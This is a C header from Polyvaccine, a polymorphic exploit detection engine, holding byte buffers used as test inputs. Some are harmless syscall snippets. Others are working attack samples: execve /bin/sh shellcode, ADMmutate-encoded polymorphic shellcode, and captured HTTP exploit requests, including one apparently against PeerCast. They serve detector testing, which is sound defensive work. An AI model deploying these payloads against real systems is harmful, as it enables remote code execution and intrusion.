/* 
 * Polyvaccine a Polymorphic exploit detection engine.
 *                                                              
 * Copyright (C) 2009  Luis Campo Giralte 
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Library General Public
 * License as published by the Free Software Foundation; either
 * version 2 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Library General Public License for more details.
 *
 * You should have received a copy of the GNU Library General Public
 * License along with this library; if not, write to the
 * Free Software Foundation, Inc., 51 Franklin St, Fifth Floor,
 * Boston, MA  02110-1301, USA.
 *
 * Written by Luis Campo Giralte <luis.camp0.2009@gmail.com> 2009 
 *
 */

#ifndef _EXAMPLES_H_
#define _EXAMPLES_H_

/* 32 bits binary buffers for testing */

char exit_0_32bits [] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  "\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80";
int size_exit_0_32bits = 20;

char *nop_buffer= "\x90\x90\x90\x90\x90\x90\x90";
int size_nop_buffer = 7;

char *bucle_1_32bits = /* bucle for simple con llamada write dentro */
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x56\x51\x83\xec\x20\x8d"
"\x4d\xea\xbe\x04\x00\x00\x00\xba\x0e\x00\x00\x00\x89\xf0\x53\xbb\x01\x00\x00"
"\x00\xcd\x80\x5b\x89\xf0\x53\xbb\x01\x00\x00\x00\xcd\x80\x5b\x89\xf0\x53\xbb"
"\x01\x00\x00\x00\xcd\x80\x5b\x89\xf0\x53\xbb\x01\x00\x00\x00\xcd\x80\x5b\x89"
"\xf0\x53\xbb\x01\x00\x00\x00\xcd\x80\x5b\xb8\x01\x00\x00\x00\x53\xbb\x00\x00"
"\x00\x00\xcd\x80\x5b\x83\xc4\x20\x59\x5e\xc9\x8d\x61\xfc\xc3";

int size_bucle_1_32bits = 110;

char *bucle2 = /* dos bucles for anidados */
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x57\x56\x51\x83\xec\x10"
"\x8d\x75\xe6\x31\xff\xba\x0e\x00\x00\x00\x8d\x76\x00\xb8\x04\x00\x00\x00\x89"
"\xf1\x53\xbb\x01\x00\x00\x00\xcd\x80\x5b\xb8\x04\x00\x00\x00\x53\xbb\x01\x00"
"\x00\x00\xcd\x80\x5b\x47\x83\xff\x05\x75\xdc\xb8\x01\x00\x00\x00\x53\xbb\x00"
"\x00\x00\x00\xcd\x80\x5b\x83\xc4\x10\x59\x5e\x5f\xc9\x8d\x61\xfc\xc3";

int size_bucle2 = 93;

char *bucle_for =
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x56\x53\xe8\x00\x00\x00"
"\x00\x5b\x83\xc3\xec\x8d\x8b\x78\x00\x00\x00\xbe\x04\x00\x00\x00\xba\x05\x00"
"\x00\x00\x89\xf0\x53\xbb\x00\x00\x00\x00\xcd\x80\x5b\x89\xf0\x53\xbb\x00\x00"
"\x00\x00\xcd\x80\x5b\x89\xf0\x53\xbb\x00\x00\x00\x00\xcd\x80\x5b\x89\xf0\x53"
"\xbb\x00\x00\x00\x00\xcd\x80\x5b\x89\xf0\x53\xbb\x00\x00\x00\x00\xcd\x80\x5b"
"\xb8\x01\x00\x00\x00\x53\xbb\x00\x00\x00\x00\xcd\x80\x5b\x83\xc4\x10\x59\x5b"
"\x5e\xc9\x8d\x61\xfc\xc3\x68\x6f\x6c\x61\x0a\x00";

int size_bucle_for = (19 * 6 ) + 12;

char *admmutate_1_32bits = /* tiene unos writes dentro */ 
"\x44\x5d\x51\x43\x58\x55\x51\x55\x48\xf5\x58\x27\x49\x92\x91\x5a"
"\x5e\x95\x49\x55\x45\x27\x4d\xf5\x5a\x52\x5b\x55\x53\x53\x49\x44"
"\x5b\x46\x9c\x46\x55\x93\x4d\xf9\x59\x98\x5d\x5f\x9c\x55\x43\x4d"
"\x55\x4f\x3f\x5a\x41\x4e\x5f\x9f\xf9\x91\xf8\x2f\x53\xf9\x91\x50"
"\x91\x40\x93\x92\x56\xf8\x27\x4b\xf9\x97\x42\x3f\x53\xf8\x43\x5a"
"\x27\xf5\x5e\x4e\x27\x98\x58\x93\x47\x4c\x91\x42\x5d\x41\x9c\x9f"
"\x46\x47\x54\x56\x4f\x92\x3f\x53\x4b\x2f\xf8\x59\xfc\x27\x46\x46"
"\x5d\x43\x91\x97\x45\xfc\x96\x41\x45\x91\x4d\x52\x45\x50\x4f\x37"
"\x3f\x41\x91\x57\x4c\x55\x96\x50\x42\x9e\x97\x53\x47\x60\x59\x42"
"\x4f\x98\x60\x4b\x96\x49\x27\xf9\x4b\xf9\x37\x9b\x5f\x5d\x55\x47"
"\x9f\xf9\x91\xf8\x4a\x9f\x47\x2f\x49\x59\x53\x47\x95\x97\xfc\x4a"
"\x60\xfc\x53\x95\x53\x60\x40\x58\x55\x44\x95\xfc\x4d\x45\x43\x56"
"\x4c\x5e\x48\x4b\x40\xf5\xf8\x95\x58\x58\x59\x99\x4c\x95\x56\x4b"
"\x44\x42\x40\x59\x97\x56\x99\x44\x93\x4a\x54\xf8\x41\xfc\x53\x42"
"\xf9\x59\x27\x9b\x3f\x98\x9f\x97\x53\x4a\xf8\x91\x98\xf8\x5a\x37"
"\x4b\x43\x97\x97\x45\x55\x4d\xf9\x95\x9f\x9e\x59\x49\x56\x41\x5f"
"\x91\x40\x5a\x59\x2f\x40\x4b\xf9\x3f\x4d\x60\x43\x9f\x52\xf5\x5a"
"\x92\x59\x5d\x92\x95\xfc\x4a\x96\x9e\x44\xfc\x46\x60\x40\xf8\x46"
"\x99\x99\x4f\x48\x37\x5f\x40\x99\xf9\x41\x91\x4d\x51\x9b\x49\xf9"
"\x44\x91\x91\xf8\x42\xf5\x4d\x40\xf8\x58\x42\x4d\x47\x49\x98\x50"
"\x5b\x57\x56\xfc\x2f\x43\x40\x46\x53\x92\x60\x99\xf5\x91\x91\x58"
"\x51\x3f\x27\xf5\x27\x97\x4a\x48\x59\x40\x48\x9c\x56\x57\x4a\x92"
"\x46\x54\xf5\x4d\x55\x9f\x4a\x40\x5a\x4d\x9c\x58\x9c\x3f\x45\x91"
"\x59\x51\x50\x9f\x5a\x3f\x27\xf5\x5a\x49\x3f\x44\x91\x97\x44\x9f"
"\x97\xf9\x42\x4a\x92\x9b\x5b\x37\x4e\x9e\x97\x46\x58\x50\x98\x45"
"\xf5\x44\x44\x5e\x97\x93\x41\x27\x92\x5e\x53\x5d\x9f\x4a\xf5\x9e"
"\x57\x41\x98\x4a\x5b\x57\xfc\xeb\x51\xb0\xed\x8c\xc0\x90\x8c\xc0"
"\x5e\xf7\xd0\x33\xc0\x31\xc0\x91\x83\xc0\xc6\x48\xc1\xc0\xef\x85"
"\xc0\x92\x68\xe9\xc2\x9d\xe5\x5b\x90\x83\xe8\x6a\xb1\x20\x48\x98"
"\x87\xd2\x93\x31\x06\x93\x81\xc3\x82\x28\x63\x29\x98\x9f\x40\x83"
"\xc6\x01\x98\x83\xf0\x52\xf9\x96\x40\x96\x8c\xc0\x46\x9f\x96\x40"
"\x96\x85\xc0\xe2\xdd\x85\xc0\xeb\x07\xf5\xe8\xb1\xff\xff\xff\x79"
"\x4f\xd1\xc1\x6f\x68\xe4\xff\x12\x62\x98\x6d\xe6\xd9\x91\x32\x19"
"\x64\x2a\x8b\x73\xd6\x0e\x77\x19\x38\x7b\xa5\x77\xde\x53\xb9\xfd"
"\x06\xb7\x30\xc1\x2a\x1a\x5a\xfd\xde\x8d\xd0\xc4\x80\xe0\xac\x01"
"\x64\xc3\x8d\x0a\x21\xf5\x44\x05\xfa\x09\x29\x4a\xa2\x36\xdb\xf9"
"\x18\x6b\x7b\x8b\x73\x33\x68\x8d\xc7\x1f\x3e\xdc\x7f\xf9\xf7\x11"
"\xed\x91\xa1\xc8\x9c\x30\x19\xae\x3e\x23\x74\x97\xab\x06\xc6\xa1"
"\x8e\xe9\xc6\x9b\xe4\xf7\xf0\x1d\xe0\xaf\xd4\x1f\x53\x90\x87\x31"
"\x68\x2d\x32\x6a\xd4\xb8\x69\xe6\xea\x53\xd3\xc6\xa0\x0f"
;

int size_admmutate_1_32bits = 638;

char *shellcode_1 = 
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x57\x56\x53"
"\xe8\x00\x00\x00\x00\x5b\x83\xc3\xeb\x8d\xb3\x4b\x00\x00\x00\x8d"
"\xbb\x4e\x00\x00\x00\xb8\x0b\x00\x00\x00\x31\xd2\x89\xf1\x53\x89"
"\xfb\xcd\x80\x5b\xb8\x01\x00\x00\x00\x53\xbb\x00\x00\x00\x00\xcd"
"\x80\x5b\x59\x5b\x5e\x5f\xc9\x8d\x61\xfc\xc3\x73\x68\x00\x2f\x62"
"\x69\x6e\x2f\x73\x68\x00"
;

int size_shellcode_1 = 86;

char *shellcode_2 = /* es igual que shellcode_1 pero con mierda al 
			principio */
/* b8 aa f3 03 00       	mov    $0x3f3aa,%eax */
/* 89 06                	mov    %eax,(%esi) */
"\xb8\xaa\xf3\x03\xff"
"\x89\x06"
//"\x00\x00\x00\x00\x00"
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x57\x56\x53"
"\xe8\x00\x00\x00\x00\x5b\x83\xc3\xeb\x8d\xb3\x4b\x00\x00\x00\x8d"
"\xbb\x4e\x00\x00\x00\xb8\x0b\x00\x00\x00\x31\xd2\x89\xf1\x53\x89"
"\xfb\xcd\x80\x5b\xb8\x01\x00\x00\x00\x53\xbb\x00\x00\x00\x00\xcd"
"\x80\x5b\x59\x5b\x5e\x5f\xc9\x8d\x61\xfc\xc3\x73\x68\x00\x2f\x62"
"\x69\x6e\x2f\x73\x68\x00"
;

int size_shellcode_2 = 86 + 6 /* el ultimo valor es el trash */;


char *buffer_printf = 
"\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x53\xe8\x00"
"\x00\x00\x00\x5b\x83\xc3\xed\x8d\x8b\x45\x00\x00\x00\xb8\x04\x00"
"\x00\x00\xba\x0e\x00\x00\x00\x53\xbb\x00\x00\x00\x00\xcd\x80\x5b"
"\xb8\x01\x00\x00\x00\x53\xbb\x00\x00\x00\x00\xcd\x80\x5b\x59\x5b"
"\xc9\x8d\x61\xfc\xc3\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x43\x6f"
"\x64\x65\x0a\x00";

int size_buffer_printf = 84;

/* del fichero /data/pcapfiles/http.fnstenv_mov.pcap */
char *fnstenv_1_32bits = 
"\x47\x45\x54\x20\x2f\x73\x74\x72\x65\x61\x6d\x2f\x3f\x78\x64\x39"
"\x67\x57\x51\x35\x79\x49\x31\x68\x73\x75\x45\x6c\x44\x49\x46\x6f"
"\x4d\x59\x36\x44\x6b\x6c\x4c\x79\x74\x37\x33\x63\x6a\x43\x6e\x52"
"\x6f\x4e\x4f\x71\x58\x72\x7a\x72\x6f\x75\x4c\x32\x4a\x48\x38\x71"
"\x34\x66\x46\x73\x51\x4e\x73\x55\x4b\x72\x6a\x44\x71\x49\x6d\x62"
"\x35\x73\x62\x33\x70\x46\x6f\x6f\x55\x64\x56\x47\x52\x63\x70\x47"
"\x47\x76\x4b\x77\x58\x63\x5a\x61\x62\x79\x54\x77\x72\x65\x48\x4d"
"\x63\x4d\x34\x45\x56\x6d\x69\x65\x54\x50\x56\x65\x6b\x6d\x66\x78"
"\x4a\x7a\x35\x32\x59\x53\x47\x46\x6e\x6a\x55\x31\x39\x6a\x35\x4a"
"\x59\x68\x58\x31\x61\x53\x59\x74\x35\x44\x55\x49\x50\x69\x4f\x55"
"\x78\x6d\x67\x77\x30\x5a\x41\x62\x55\x42\x71\x4d\x47\x76\x61\x57"
"\x58\x72\x36\x56\x56\x58\x52\x6b\x53\x4c\x58\x4d\x79\x36\x55\x71"
"\x6d\x57\x50\x64\x38\x4f\x52\x65\x32\x55\x45\x39\x71\x79\x48\x78"
"\x55\x36\x33\x4d\x45\x4c\x44\x7a\x55\x63\x4b\x46\x6a\x4f\x4c\x41"
"\x32\x33\x62\x74\x4a\x75\x31\x58\x41\x65\x48\x53\x7a\x33\x65\x37"
"\x48\x78\x55\x71\x65\x69\x6d\x71\x37\x6d\x33\x61\x51\x34\x59\x64"
"\x36\x53\x66\x75\x6a\x32\x34\x78\x6c\x79\x49\x32\x78\x74\x59\x6d"
"\x46\x62\x6f\x37\x47\x53\x53\x59\x31\x7a\x6e\x67\x62\x61\x4b\x47"
"\x73\x49\x69\x51\x65\x58\x51\x53\x6a\x34\x39\x39\x75\x35\x76\x52"
"\x78\x30\x69\x5a\x6d\x38\x39\x5a\x31\x73\x4e\x75\x4b\x2d\xbb\xb0"
"\x71\x46\x21\xf9\x7b\x03\xf5\xb6\x92\xbf\xb8\xb9\xb5\x40\xb4\xba"
"\x96\x66\x93\x77\x34\x90\x74\x13\xfd\x47\xb1\x98\xe2\x25\xd2\xd5"
"\x43\x42\xa9\x88\xe1\x14\xb3\x97\x2c\xa8\x49\x67\x12\xfc\x37\xd6"
"\x91\xbe\x1d\x99\xb2\x78\x05\x4a\x3f\xd4\xb7\x4f\x48\x35\x3c\x15"
"\x24\x27\x7f\x04\x0c\x1c\x9b\x41\x9f\x39\xf8\x6a\x4a\x59\xd9\xee"
"\xd9\x74\x24\xf4\x5b\x81\x73\x13\x99\x9b\x96\xce\x83\xeb\xfc\xe2"
"\xf4\x18\x5f\xc2\x3c\x66\x64\x6a\xa4\x72\xd6\x7e\x37\x66\x64\x69"
"\xae\x12\xf7\xb2\xea\x12\xde\xaa\x45\xe5\x9e\xee\xcf\x76\x10\xd9"
"\xd6\x12\xc4\xb6\xcf\x72\xd2\x1d\xfa\x12\x9a\x78\xff\x59\x02\x3a"
"\x4a\x59\xef\x91\x0f\x53\x96\x97\x0c\x72\x6f\xad\x9a\xbd\xb3\xe3"
"\x2b\x12\xc4\xb2\xcf\x72\xfd\x1d\xc2\xd2\x10\xc9\xd2\x98\x70\x95"
"\xe2\x12\x12\xfa\xea\x85\xfa\x55\xff\x42\xff\x1d\x8d\xa9\x10\xd6"
"\xc2\x12\xeb\x8a\x63\x12\xdb\x9e\x90\xf1\x15\xd8\xc0\x75\xcb\x69"
"\x18\xff\xc8\xf0\xa6\xaa\xa9\xfe\xb9\xea\xa9\xc9\x9a\x66\x4b\xfe"
"\x05\x74\x67\xad\x9e\x66\x4d\xc9\x47\x7c\xfd\x17\x23\x91\x99\xc3"
"\xa4\x9b\x64\x46\xa6\x40\x92\x63\x63\xce\x64\x40\x9d\xca\xc8\xc5"
"\x8d\xca\xd8\xc5\x31\x49\xf3\xe9\xce\x99\x9a\xf0\xa6\x88\xc7\xf0"
"\x9d\x10\x7a\x03\xa6\x75\x62\x3c\xae\xce\x64\x40\xa4\x89\xca\xc3"
"\x31\x49\xfd\xfc\xaa\xff\xf3\xf5\xa3\xf3\xcb\xcf\xe7\x55\x12\x71"
"\xa4\xdd\x12\x74\xff\x59\x68\x3c\x5b\x10\x66\x68\x8c\xb4\x65\xd4"
"\xe2\x14\xe1\xae\x65\x32\x30\xfe\xbc\x67\x28\x80\x31\xec\xb3\x69"
"\x18\xc2\xcc\xc4\x9f\xc8\xca\xfc\xcf\xc8\xca\xc3\x9f\x66\x4b\xfe"
"\x63\x40\x9e\x58\x9d\x66\x4d\xfc\x31\x66\xac\x69\x1e\xf1\x7c\xef"
"\x08\xe0\x64\xe3\xca\x66\x4d\x69\xb9\x65\x64\x46\xa6\x69\x11\x92"
"\x91\xca\x64\x40\x31\x49\x9b\x96\xce\x73\x78\x67\x6e\x59\x76\x44"
"\x46\x74\x61\x34\x62\x71\x77\x65\x59\x48\x48\x6b\x59\x4e\x57\x38"
"\x74\x33\x64\x55\x64\x66\x59\x71\x5a\x56\x70\x4c\x57\x6c\x62\x56"
"\x41\x67\x4c\x69\x5a\x47\x54\x73\x30\x74\x6f\x6a\x61\x43\x41\x65"
"\x64\x56\x68\x73\x6b\x65\x31\x73\x77\x43\x65\x6a\x65\x60\x33\x02"
"\x75\x6b\x63\x45\x55\x4b\x47\x37\x37\x46\x64\x56\x50\x73\x63\x71"
"\x78\x66\x7a\x75\x77\x52\x42\x5a\x4c\x61\x4d\x4c\x46\x42\x4b\x79"
"\x68\x58\x50\x6a\x4b\x39\x73\x72\x36\xe9\xfb\xfd\xff\xff\x32\x55"
"\x61\x39\x71\x6b\x38\x32\x52\x33\x70\x4a\x49\x51\x52\x72\x68\x77"
"\x41\x43\x5a\x39\x43\x6e\x75\x38\x51\x31\x6d\x33\x53\x79\x75\x37"
"\x50\x44\x4c\x70\x69\x4a\x71\x42\x70\x41\x41\x58\x43\x44\x53\x31"
"\x47\x35\x52\x72\x56\x45\x54\x4c\x54\x70\x6f\x6c\x61\x5a\x66\x57"
"\x65\x47\x6c\x49\x33\x42\x54\x42\x78\x6d\x57\x54\x70\x42\x39\x68"
"\x65\x6f\x38\x68\x5a\x56\x50\x5a\x5a\x36\x61\x39\x47\x32\x76\x62"
"\x49\x53\x55\x72\x34\x59\x4f\x59\x61\x35\x79\x47\x6f\x67\x61\x70"
"\x4b\x46\x52\x53\x65\x41\x74\x57\x42\x69\x36\x63\x37\x54\x5a\x38"
"\x61\x57\x37\x6d\x59\x4f\x51\x41\x4c\x34\x50\x79\x6a\x33\x6d\x50"
"\x48\x62\x7a\x48\x6a\x39\x6d\x34\x72\x50\x62\x76\x6e\x63\x7a\x6e"
"\x71\x32\x56\x56\x38\x65\x78\x6f\x78\x58\x63\x78\x55\x6c\x59\x55"
"\x43\x34\x69\x4b\x53\x74\x31\x38\x42\x61\x65\x49\x36\x6f\x47\x41"
"\x4b\x30\x35\x67\x65\x7a\x4a\x56\x4e\x43\x4e\x4e\x6a\x20\x48\x54"
"\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a";

int size_fnstenv_1_32bits = 1034;

char *admmutate_2 = 
"\x42\x44\x51\x97\x46\x92\x50\x58\x59\x98\x47\x41\x52\x96\x97\x54"
"\x48\x4d\x45\x47\x27\x5f\x9b\x98\x59\x44\x49\x42\x97\x4f\x4a\x53"
"\x43\x59\x55\x27\x4e\x4f\x9b\x99\x96\x4f\x57\x4b\x27\xf9\x50\x91"
"\x41\x98\x4b\x2f\x9f\x97\x9e\x60\x57\x97\x53\x95\x95\x53\x59\x97"
"\x9f\x97\x57\x97\x2f\x95\x5f\x59\x4f\x4c\x5a\x97\x99\x5e\x40\x43"
"\x59\xf5\x40\x4a\x56\x4c\x4d\x4e\xf8\x54\x5e\x27\x47\x41\x4e\x5e"
"\x97\x97\x9f\x44\xf9\x27\x55\x5e\x5f\x54\xf8\x4b\x46\x5e\x5e\x51"
"\x4a\x60\x43\x5e\x95\x4e\xf9\xf9\x5d\x5b\x91\x4b\x49\x53\x92\x54"
"\x46\x53\x93\x4c\x98\x9f\x9e\x27\x48\x2f\x5d\x53\x51\x49\x52\x99"
"\x27\x27\x5f\x51\x41\x97\x4f\x9b\x54\x58\x49\x41\x47\x27\x99\x27"
"\x99\x49\x98\x5f\xf9\x97\x9e\x40\x47\x99\x97\x92\x4e\x96\x4f\x42"
"\x95\x4e\xf8\x57\x45\x9b\x37\x92\x5a\x53\x5b\x42\x97\x45\xf9\x55"
"\x9f\xf5\x3f\x5d\x5e\x37\x47\xf8\x4d\x27\x51\x51\x52\x52\x9f\xf9"
"\x93\x53\x54\x45\xf9\x96\x4f\x49\x40\x95\x4a\x56\x51\x48\xf9\x96"
"\x4a\x96\xf8\x99\x2f\x92\x4b\x95\x5b\x96\x59\xfc\x4e\x43\x40\x9b"
"\x4b\x49\x60\x46\x5e\x55\x5b\x40\x49\xf9\x92\x4d\x43\x9c\x9b\x56"
"\x9b\x5a\x4d\x5d\x99\xf5\x4a\x51\x4d\x5b\x54\x48\x59\x97\x52\x91"
"\x47\x98\xf9\x4d\x60\x45\x53\x4b\x5f\x9e\x40\x5d\x41\x3f\x97\x93"
"\x27\x92\x9f\x5b\x9f\x37\x51\x9e\x5a\x50\x98\x4c\x60\x96\x9c\x5b"
"\x42\x47\x97\x96\x45\xfc\x92\x4d\x9b\x41\x50\x55\x54\xf5\x52\x37"
"\x60\x44\x4f\x46\x49\x60\x5f\x9f\xf9\x4e\x4f\x5b\x27\x2f\x9f\x97"
"\x44\xf9\x5a\x9f\x4a\x97\x93\x96\x95\x5a\x56\x91\x44\x4c\x4f\x27"
"\x44\x44\x48\xfc\x95\x4c\x46\x9e\x9c\xfc\x9c\x45\x56\x99\x27\x41"
"\x96\x5b\x4a\x44\x9c\x48\x99\x60\x44\x57\x45\x95\x43\x9c\x5a\x37"
"\x93\x53\x3f\x93\x59\x91\x9e\x9e\x54\x3f\x40\x42\x9b\xf8\xf9\x5d"
"\x5f\x53\x5d\x52\x4c\x2f\x99\x54\x49\x51\x51\x91\x27\x48\x56\x4c"
"\x59\x96\x46\x47\x44\xf9\x41\x57\xf5\x4a\x43\xeb\x4d\x58\x96\x27"
"\x31\xc9\x9b\xc1\xc8\xc5\x68\xff\xee\x06\x2d\x5b\x8c\xe8\xc1\xc8"
"\xd3\x6a\x20\x66\x59\x8b\x06\x09\xd8\x21\x1e\xf7\x16\x21\x06\x4f"
"\x81\xc3\x15\x9a\x01\x50\x40\xf5\x96\x40\x96\xf8\x98\x46\x83\xe8"
"\xa2\xc1\xc0\x10\x46\xc1\xc0\x2a\xfc\x96\x40\x96\x85\xc0\xfc\x9b"
"\xe2\xd3\x99\x33\xc0\xeb\x09\xf9\x87\xc9\xe8\xae\xff\xff\xff\x6f"
"\x63\x4a\x09\x10\x0a\xec\x8d\xd6\x52\xf6\x98\xb7\x58\x5d\x4e\xbb"
"\x57\x0d\x6d\x68\xaa\x8d\x7e\x91\x06\x9b\x75\x92\x25\x12\xe3\xa3"
"\xbf\x13\xad\x06\x5c\x15\xfd\xd1\x7a\xe6\x1e\x5d\x8d\x18\x9d\xfb"
"\xea\x9a\xb6\x99\x32\x48\x86\x25\x5c\x1d\x8d\xf7\x76\x45\x54\xbf"
"\xc3\x9b\x2d\x64\x2a\x22\xb0\xf9\x9f\xaa\x3d\xdd\xe5\x25\x1d\xa3"
"\xf8\xeb\xed\xe3\x1b\xd8\xee\x76\x2c\x2a\x0d\xe2\x0b\xab\x06\x4f"
"\x61\x2d\xad\x0c\xa8\x95\xfd\x21\x95\x30\x80\xb6\x74\xb1\x59\x5b"
"\x90\x68\xb3\xa9\xee\x54\xc1\xb6\x95\x59\xe1\xeb\x9d\xa8"
;
int size_admmutate_2 = 638;

char *peercast = 
"\x47\x45\x54\x20\x2f\x73\x74\x72\x65\x61\x6d\x2f\x3f\x58\x39\x37"
"\x67\x54\x54\x57\x34\x72\x6a\x50\x41\x42\x70\x74\x31\x51\x74\x66"
"\x7a\x50\x70\x67\x76\x34\x44\x44\x46\x45\x73\x78\x63\x6e\x6e\x46"
"\x45\x33\x73\x6c\x5a\x46\x67\x78\x54\x6c\x51\x38\x56\x6d\x5a\x47"
"\x70\x4c\x56\x50\x6f\x49\x51\x53\x43\x72\x75\x54\x69\x4b\x52\x36"
"\x41\x48\x41\x4e\x72\x6b\x6c\x77\x44\x70\x7a\x47\x65\x57\x45\x35"
"\x6b\x4f\x4b\x65\x38\x64\x44\x58\x43\x6f\x32\x71\x34\x4a\x68\x59"
"\x39\x34\x6c\x55\x51\x64\x53\x77\x37\x33\x45\x37\x54\x64\x73\x6d"
"\x36\x70\x76\x76\x34\x51\x6c\x55\x4f\x39\x50\x4f\x39\x44\x50\x56"
"\x51\x6a\x4a\x62\x59\x52\x44\x50\x73\x44\x49\x38\x66\x57\x5a\x6d"
"\x4b\x34\x57\x73\x30\x73\x41\x41\x73\x4e\x45\x35\x56\x37\x6f\x48"
"\x6b\x73\x51\x54\x72\x41\x56\x76\x79\x58\x4d\x69\x44\x4a\x64\x7a"
"\x6a\x51\x57\x57\x6e\x36\x4a\x69\x67\x68\x63\x74\x42\x77\x71\x50"
"\x67\x74\x39\x56\x36\x4e\x4c\x48\x67\x70\x39\x4d\x70\x55\x46\x46"
"\x51\x33\x32\x6c\x31\x76\x6a\x63\x7a\x54\x76\x46\x6f\x74\x38\x36"
"\x78\x32\x6c\x74\x6b\x67\x6f\x72\x41\x6b\x55\x57\x39\x45\x76\x34"
"\x57\x62\x71\x38\x42\x33\x74\x34\x43\x72\x70\x48\x51\x7a\x47\x71"
"\x43\x75\x42\x4f\x31\x68\x30\x6d\x61\x41\x4e\x43\x6f\x69\x74\x76"
"\x46\x72\x78\x48\x6c\x52\x68\x37\x36\x74\x64\x33\x61\x49\x6e\x50"
"\x52\x67\x4f\x62\x32\x48\x59\x39\x45\x56\x6a\x74\x31\x70\x70\x73"
"\x44\x65\x6e\x75\x59\x74\x68\x4c\x62\x71\x73\x70\x46\x4b\x57\x48"
"\x6d\x4c\x6f\x4b\x79\x63\x72\x75\x37\x33\x4e\x64\x38\x42\x49\x4d"
"\x77\x79\x61\x46\x57\x72\x77\x61\x65\x79\x49\x58\x72\x48\x42\x30"
"\x70\x73\x44\x57\x4a\x69\x69\x4d\x66\x4e\x76\x6b\x4f\x64\x43\x61"
"\x31\x4a\x63\x6e\x6e\x56\x32\x41\x69\x44\x59\x59\x6b\x73\x77\x4c"
"\x69\x7a\x54\x36\x35\x56\x4b\x31\x6c\x74\x59\x74\x34\x30\x73\x43"
"\x4d\x72\x7a\x32\x44\x6c\x30\x73\x33\x74\x46\x49\x49\x75\x72\x75"
"\x51\x30\x69\x57\x41\x68\x51\x45\x34\x54\x62\x61\x62\x4f\x42\x54"
"\x57\x52\x41\x50\x4f\x65\x63\x45\x66\x45\x6e\x52\x4d\x4e\x6a\x4d"
"\x42\x32\x4a\x45\x41\x78\x58\x32\x5a\x44\x4f\x67\x70\x37\x50\x59"
"\x77\x51\x46\x5a\x77\x71\x41\x56\x63\x33\x55\x62\x74\x45\x50\x31"
"\x54\x6b\x76\x6e\x6f\x52\x65\x58\x5a\x57\x79\x38\x4f\x59\x50\x52"
"\x44\x38\x4e\x55\x4c\x6e\x79\x5a\x63\x71\x47\x71\x39\x6d\x4e\x38"
"\x59\x69\x78\x54\x43\x6a\x35\x76\x35\x55\x52\x43\x75\x55\x43\x6f"
"\x4c\x6e\x6f\x44\x75\x5a\x7a\x6f\x6b\x41\x4f\x51\x77\x79\x6c\x58"
"\x44\x35\x62\x66\x32\x37\x46\x70\x36\x38\x56\x6f\x33\x33\x70\x56"
"\x75\x70\x7a\x79\x31\x72\x39\x69\x71\x54\x71\x72\x75\x74\x53\x39"
"\x4e\x4f\x37\x53\x4c\x69\x61\x56\x50\x67\x6a\x5a\x68\x61\x6c\x4a"
"\x65\x39\x6e\x7a\x39\x50\x55\x53\x68\x49\x41\x4f\x51\x66\x79\x6a"
"\x61\x51\x48\x55\x52\x77\x72\x6b\x39\x33\x36\x41\x68\x31\x31\x71"
"\x43\x62\x65\x47\x34\x72\x34\x38\x79\x7a\x33\x4e\x66\x70\x34\x42"
"\x6f\x33\x6a\x37\x52\x5a\x47\x77\x45\x4c\x50\x66\x75\x65\x69\x4e"
"\x53\x56\x70\x45\x52\x46\x79\x35\x58\x79\x63\x72\x70\x39\x35\x69"
"\x41\x35\x64\x65\x6a\x58\x6f\x76\x59\x56\x4c\x41\x39\x63\x59\x48"
"\x6b\x71\x33\x6a\x53\x57\x51\x62\x4d\x77\x47\x63\x37\x7a\x61\x69"
"\x73\x77\x62\x31\x6e\x31\x56\x33\x4e\x77\x4d\x4e\x79\x61\x74\x6b"
"\x55\x4a\x67\x32\x73\x64\x52\x35\x75\x32\x4e\x66\x7a\x55\x37\x5a"
"\x72\x58\x4e\x72\x6e\x70\x6d\x50\x45\x6c\x62\x52\x4c\x66\x64\x4e"
"\x42\x68\x62\x53\x52\x4d\x4e\x68\x72\x72\x68\x47\x64\x64\x6c\x67"
"\x57\x46\x32\x6f\x50\x56\x35\x4a\x5a\xf7\x22\x09\x08\xb6\x78\x43"
"\xb3\x7c\x1a\xe0\x35\x72\x02\xf5\x9b\x74\x47\xba\xb1\xbf\xa9\x73"
"\x27\xb2\x3c\x7a\x43\x86\xf5\xa9\x9f\x98\x79\x04\x75\x35\x7e\x42"
"\x77\x2b\xf7\xd3\xf9\xb1\xb9\x93\x40\x6b\xfc\x4f\x12\xfd\xd2\xeb"
"\x1d\xb8\x37\x66\xb4\x34\x4a\x48\x9b\x76\x13\xd4\x33\xd5\x41\xf8"
"\x4e\xb6\x24\x2d\x3f\x97\x90\xbe\x96\x15\x92\x67\x49\x1c\xbb\x81"
"\xd6\x4b\xb0\x2c\xbf\x05\xba\x91\x14\x25\x0c\xb3\x46\x47\xa8\xb5"
"\xb7\x99\xba\xd6\x06\x8a\xfd\xd9\xe9\xd9\x74\x24\xf4\x5e\x33\xc9"
"\xb1\x13\x31\x56\x12\x03\x56\x12\x83\x38\xfa\x68\x08\xf5\xd8\x3e"
"\xb0\xa6\xb4\xc2\x5c\x2e\x11\x4a\x41\x63\x21\xdf\xdb\xcb\x1d\x2d"
"\x5b\x62\x1b\x54\x07\x2e\xb3\xd9\xb8\xce\x42\x40\xd1\xdf\x19\xcf"
"\x47\x8c\x28\x2e\x37\x54\x7b\xe0\x6b\x11\x9a\x41\x41\xa1\x0f\x2e"
"\x76\x8e\xdc\xc6\xe0\xff\x40\x7e\x9f\x76\x67\xd2\x0c\x01\x89\x63"
"\xb9\xdc\xca\x84\xbe\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a"
"\x0d\x0a"
;

int size_peercast = 1010;

